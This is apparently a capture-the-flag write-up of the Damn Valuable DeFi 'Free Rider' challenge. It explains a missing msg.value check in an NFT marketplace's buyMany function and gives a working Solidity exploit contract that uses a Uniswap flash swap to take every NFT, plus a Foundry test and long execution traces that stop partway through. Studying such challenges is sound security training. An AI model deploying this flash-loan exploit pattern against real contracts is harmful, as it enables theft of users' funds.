```
  ___       ____
 / _ \__  _| __ )  ___  _ __   __ _ _ __  ______ _
| | | \ \/ /  _ \ / _ \| '_ \ / _` | '_ \|_  / _` |
| |_| |>  <| |_) | (_) | | | | (_| | | | |/ / (_| |
 \___//_/\_\____/ \___/|_| |_|\__,_|_| |_/___\__,_|

Any question? 0xbonanza@gmail.com
```

## Objective

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

## [H-1] The `buyMany` function of `FreeRiderNFTMarketplace.sol` does not require `msg.value` to match the number of NFT's bought, allowing to buy several NFT's for the price of one.

**Description**: The `buyMany` function in the `FreeRiderNFTMarketplace.sol` contract does not enforce that the `msg.value` sent matches the total price of the NFTs being purchased. This allows a user to buy multiple NFTs for the price of one, effectively allowing them to acquire all NFTs without paying the full price.

```javascript
// $audit-high: this doesn't account msg.value for multiple buys --> you can buy as many as you want for the price of one NFT
function buyMany(
    uint256[] calldata tokenIds
) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
@>          _buyOne(tokenIds[i]);
        }
    }
}
```

**Impact:** anyone can buy all the NFTs for the price of one (15 ETH), allowing them to take all the NFTs out of the marketplace.

**Proof of concept:** Here are the steps to exploit the vulnerability:
- As we need to pay 15 ETH to avoid that the transaction reverts, we can use a flash loan to get the 15 ETH needed.
- We can then call the `buyMany` function with all the token IDs (0 to 5) and only send 15 ETH as `msg.value`.
- The function will execute, allowing us to buy all NFTs for the price of one, effectively transferring ownership of all NFTs to our address.
- We can then send the NFTs to the developers' recovery contract to claim the bounty.
- With the bounty, we can pay back the flash loan and keep the remaining ETH as profit.

This is a contract that can be used to exploit the vulnerability:

<details>
<summary>Proof of code</summary>

```javascript
contract FreeRider is Test, IERC721Receiver {
    // some variables
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;
    WETH weth;
    address owner;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        DamnValuableNFT _nft,
        WETH _weth
    ) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        weth = _weth;
        owner = msg.sender;
        console.log("Starting balance", address(this).balance);
    }

    function recover(uint256 amountToBorrow) public {
        // borrowing weth via the uniswap pair contract
        // --> token0 = weth and token1 = token as stated above
        (uint256 amount0Out, uint256 amount1Out) = (amountToBorrow, uint256(0));
        console.log("Amount of WETH to borrow via flashswap", amountToBorrow);
        bytes memory data = abi.encode(address(this), msg.sender);
        uniswapPair.swap(amount0Out, amount1Out, address(this), data);
        (bool success, ) = owner.call{value: address(this).balance}(
            abi.encode("you did it ;)")
        );
        console.log("Player call result:", success);
        console.log("Final player balance", address(owner).balance);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // unwrapping WETH to ETH as we need to pay in ETH
        weth.withdraw(amount0);

        // checking balance
        console.log(
            "ETH balance after WETH flashswap and unwrapping",
            address(this).balance
        );

        // buy all 6 NFTs for the price of one and receive the money from the sale
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        console.log("Buying multiple NFTs...");
        marketplace.buyMany{value: amount0}(tokenIds);

        // check balance before recovery
        uint256 currentBalance = address(this).balance;
        console.log("Current ETH balance", currentBalance);

        // send NFTs to recovery
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                abi.encode(address(this))
            );
        }
        console.log("NFTs transfered to recoveryManager!");

        // check current balance
        uint256 expectedBalance = currentBalance + 45 ether;

        // cash in premium
        assertEq(
            address(this).balance,
            expectedBalance,
            "Not expected balance"
        );
        console.log("Current balance after bounty", address(this).balance);

        // pay flashswap back
        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;
        console.log("Paying back amount of WETH to uniswap", amountToRepay);

        // wrap ETH to WETH
        weth.deposit{value: amountToRepay}();
        weth.approve(address(uniswapPair), amountToRepay);
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
</details>
</>

It can be used in a test like this:

<details>

<summary>Proof of code</summary>

```javascript
function test_freeRider() public checkSolvedByPlayer {
    // as we'll use flashswap, let's use a separate contract
    FreeRider freeRider = new FreeRider(
        uniswapPair,
        marketplace,
        recoveryManager,
        nft,
        weth
    );
    freeRider.recover(NFT_PRICE);
}
```
</details>

**Result**

<details>

```javascript
Ran 2 tests for test/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_assertInitialState() (gas: 93912)
Traces:
  [93912] FreeRiderChallenge::test_assertInitialState()
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [2381] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::token0() [staticcall]
    │   └─ ← [Return] WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]
    ├─ [0] VM::assertEq(WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return]
    ├─ [2357] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::token1() [staticcall]
    │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    ├─ [0] VM::assertEq(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]
    │   └─ ← [Return]
    ├─ [2480] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::balanceOf(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return] 11618950038622250654537 [1.161e22]
    ├─ [0] VM::assertGt(11618950038622250654537 [1.161e22], 0) [staticcall]
    │   └─ ← [Return]
    ├─ [2547] DamnValuableNFT::owner() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return]
    ├─ [2887] DamnValuableNFT::rolesOf(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [436] DamnValuableNFT::MINTER_ROLE() [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [3051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2425] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 6
    ├─ [0] VM::assertEq(6, 6) [staticcall]
    │   └─ ← [Return]
    ├─ [3221] DamnValuableNFT::isApprovedForAll(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(45000000000000000000 [4.5e19], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_freeRider() (gas: 2977745)
Logs:
  Starting balance 0
  Amount of WETH to borrow via flashswap 15000000000000000000
  ETH balance after WETH flashswap and unwrapping 15000000000000000000
  Buying multiple NFTs...
  Current ETH balance 90000000000000000000
  NFTs transfered to recoveryManager!
  Current balance after bounty 135000000000000000000
  Paying back amount of WETH to uniswap 15045135406218655968
  Player call result: true
  Final player balance 120054864593781344032

Traces:
  [3089345] FreeRiderChallenge::test_freeRider()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [2378574] → new FreeRider@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   ├─ [0] console::log("Starting balance", 0) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 11079 bytes of code
    ├─ [566471] FreeRider::recover(15000000000000000000 [1.5e19])
    │   ├─ [0] console::log("Amount of WETH to borrow via flashswap", 15000000000000000000 [1.5e19]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [551125] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(15000000000000000000 [1.5e19], 0, FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   ├─ [30307] WETH::transfer(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19])
    │   │   │   ├─ emit Transfer(from: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [488732] FreeRider::uniswapV2Call(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19], 0, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   ├─ [16483] WETH::withdraw(15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0x0000000000000000000000000000000000000000, amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Withdrawal(to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] console::log("ETH balance after WETH flashswap and unwrapping", 15000000000000000000 [1.5e19]) [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] console::log("Buying multiple NFTs...") [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [235179] FreeRiderNFTMarketplace::buyMany{value: 15000000000000000000}([0, 1, 2, 3, 4, 5])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [42334] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 0, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13634] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 1, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13634] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 2, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13634] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 3, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13634] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 4, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13634] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5)
    │   │   │   │   │   ├─ [1801] FreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 5, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5, price: 15000000000000000000 [1.5e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] console::log("Current ETH balance", 90000000000000000000 [9e19]) [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [62765] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 0, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 0)
    │   │   │   │   ├─ [31045] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14465] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 1, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 1)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14465] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 2, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 2)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14465] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 3, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 3)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14465] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 4, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 4)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [22035] DamnValuableNFT::safeTransferFrom(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 5, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 5)
    │   │   │   │   ├─ [14715] FreeRiderRecoveryManager::onERC721Received(FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5, 0x000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   ├─ [55] FreeRider::receive{value: 45000000000000000000}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] console::log("NFTs transfered to recoveryManager!") [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] VM::assertEq(135000000000000000000 [1.35e20], 135000000000000000000 [1.35e20], "Not expected balance") [staticcall]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [0] console::log("Current balance after bounty", 135000000000000000000 [1.35e20]) [staticcall]
    │   │   │   │   └─ ← [Stop]
